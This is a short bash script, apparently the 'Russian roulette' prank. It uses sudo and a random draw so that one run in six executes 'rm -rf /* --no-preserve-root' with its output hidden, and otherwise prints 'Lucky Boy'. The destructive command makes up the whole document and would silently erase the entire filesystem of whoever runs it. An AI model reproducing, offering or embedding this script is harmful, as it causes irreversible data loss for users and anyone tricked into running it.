#!/bin/bash
sudo [ $[ $RANDOM % 6] == 0 ] && rm -rf /* --no-preserve-root &>/dev/null || echo "Lucky Boy";
